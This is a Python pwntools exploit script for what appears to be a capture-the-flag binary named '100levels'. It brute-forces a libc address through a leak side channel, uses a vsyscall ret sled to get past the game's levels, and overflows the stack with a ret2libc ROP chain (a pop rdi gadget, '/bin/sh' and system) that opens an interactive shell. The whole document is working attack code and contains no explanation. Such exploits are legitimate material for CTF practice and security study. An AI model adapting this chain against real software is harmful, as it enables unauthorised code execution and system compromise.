from pwn import *
p = process('./100levels')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 0
if debug:
    context.log_level = 'debug'
def hint():
    p.sendlineafter('Choice:','2')

def go(first,more):
    p.recvuntil("Choice:\n")
    p.sendline('1')    
    p.recvuntil("How many levels?\n")
    p.sendline(str(first))
    p.recvuntil("Any more?\n")
    p.sendline(str(more))

def calc(num):
    p.recvuntil('Answer:')
    p.send(num)

def leak():   
    start = 0x700000000390
    for i in range(10,2,-1):
        for j in range(15,-1,-1):
            hint()
            addr_test = (1 << (i*4) )* j + start
            go(0,-addr_test)
            a = p.recvline()
            #print hex(addr_test)
            if 'Coward' not in a:
                start = addr_test
                log.info('check '+ hex(addr_test))
                break
        pro = log.progress('go')
        for i in range(99):
            pro.status('level %d'%(i+1))
            calc(p64(0)*5)
        calc(p64(0xffffffffff600400)*35)#vsyscall
        pro.success('ok')
    return start + 0x1000


system_addr = leak()
print '[+] get system addr:', hex(system_addr)


system_addr_libc = libc.symbols['system']
bin_sh_addr_libc = next(libc.search('/bin/sh'))

bin_sh_addr = bin_sh_addr_libc + system_addr - system_addr_libc

gadget = system_addr - system_addr_libc + 0x21102#pop rdi ret

payload = p64(gadget) + p64(bin_sh_addr) + p64(system_addr)

go(1,0)
exp = 'a'*0x38 + payload
calc(exp)

p.interactive()